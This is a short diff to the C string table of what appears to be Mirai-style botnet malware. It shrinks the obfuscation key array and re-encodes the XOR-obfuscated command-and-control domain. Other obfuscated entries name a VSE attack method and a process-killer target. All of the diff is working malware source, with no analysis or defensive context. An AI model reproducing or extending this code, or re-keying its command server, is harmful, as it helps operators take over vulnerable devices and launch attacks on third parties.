@@ -11,16 +11,13 @@
 #include "util.h"
 
 uint32_t table_keys[] = {
-    0x38f7f129, 0x4a2a6db, 0x3b608da0, 0x6c34dab4, 0x3a80f431, 0x2893473, 
-    0x1988be99, 0x5f980e32, 0x54ae03d6, 0x120f2780, 0x4205ded8, 0x5eb4e0a6, 
-    0x40cd53f6, 0x2e9c2a07, 0x365bfa9f, 0x7cf02ecb, 0x1a538d95, 0x7a079f4f, 
-    0x12dfa90f, 0x6640d384
+    0x38f7f129
 };
 
 struct table_value table[TABLE_MAX_KEYS];
 
 void table_init(void) {
-    add_entry(TABLE_CNC_DOMAIN, "\x40\x4D\x4D\x40\x4C\x47\x56\x0C\x46\x57\x41\x49\x46\x4C\x51\x0C\x4D\x50\x45\x22", 20);
+    add_entry(TABLE_CNC_DOMAIN, "\x75\x78\x78\x75\x79\x72\x63\x39\x73\x62\x74\x7C\x73\x79\x64\x39\x78\x65\x70\x17", 20);
     add_entry(TABLE_EXEC_SUCCESS, "\x5b\x58\x55\x4f\x4e\x1a\x4e\x55\x1a\x59\x4f\x57\x1a\x53\x54\x49\x53\x5e\x5f\x1a\x5b\x1a\x5c\x5f\x57\x58\x55\x43\x1a\x58\x4e\x4d", 32);
     add_entry(TABLE_ATK_VSE, "\x6e\x69\x55\x4f\x48\x59\x5f\x1a\x7f\x54\x5d\x53\x54\x5f\x1a\x6b\x4f\x5f\x48\x43", 20);
     add_entry(TABLE_KILLER_PROC, "\x15\x4a\x48\x55\x59\x15", 6);
